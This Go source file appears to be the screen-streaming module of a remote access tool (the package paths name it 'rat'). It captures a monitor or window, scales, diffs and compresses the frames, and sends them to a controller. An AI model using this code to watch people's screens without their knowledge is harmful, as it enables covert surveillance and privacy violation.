package main

import (
	"bytes"
	"encoding/binary"
	"image"
	"io"
	"rat/client/screen"
	"rat/imgdiff"

	"github.com/disintegration/imaging"
	"github.com/pierrec/lz4"
)

type ScreenChannel struct {
	Active bool
	Scale  float32

	// monitor or window
	Monitor bool

	// monitor/window handle
	Handle int32
}

// reset reads new config from controller
func (sc *ScreenChannel) reset(channel io.Reader) (err error) {
	binary.Read(channel, binary.LittleEndian, &sc.Monitor)
	binary.Read(channel, binary.LittleEndian, &sc.Scale)
	err = binary.Read(channel, binary.LittleEndian, &sc.Handle)

	return
}

func (sc ScreenChannel) Open(channel io.ReadWriteCloser, c *Connection) error {
	defer channel.Close()
	var err error

	err = sc.reset(channel)

	go func() {
		for {
			err = sc.reset(channel)
			if err != nil {
				channel.Close()
				return
			}
		}
	}()

	cmp := imgdiff.NewComparer(6, 6)

	go func() {
		for {
			select {
			case <-c.die:
				return
			case chunk := <-cmp.C:
				rect := chunk.Rect

				binary.Write(channel, binary.LittleEndian, int32(rect.Min.X))
				binary.Write(channel, binary.LittleEndian, int32(rect.Min.Y))
				binary.Write(channel, binary.LittleEndian, int32(rect.Max.X))
				binary.Write(channel, binary.LittleEndian, int32(rect.Max.Y))

				var imgdata bytes.Buffer
				ll := lz4.NewWriter(&imgdata)
				imgdiff.Write(ll, chunk)
				ll.Close()

				binary.Write(channel, binary.LittleEndian, int32(imgdata.Len()))
				if _, err = channel.Write(imgdata.Bytes()); err != nil {
					return
				}
			}
		}
	}()

	for err == nil {
		var capture image.Image
		if sc.Monitor {
			capture = screen.Capture(screen.Monitors[sc.Handle])
		} else {
			capture = screen.CaptureWindow(int(sc.Handle))
		}

		rect := capture.Bounds()

		if sc.Scale > 0 && sc.Scale < 1.0 {
			width := int(float32(rect.Dx()) * sc.Scale)
			height := int(float32(rect.Dy()) * sc.Scale)

			nrgba := imaging.Resize(capture, width, height, imaging.Linear)
			capture = &image.RGBA{
				Pix:    nrgba.Pix,
				Stride: nrgba.Stride,
				Rect:   nrgba.Rect,
			}
		}

		cmp.Update(capture.(*image.RGBA))

		select {
		case <-c.die:
			return nil
		default:
		}
	}

	return err
}
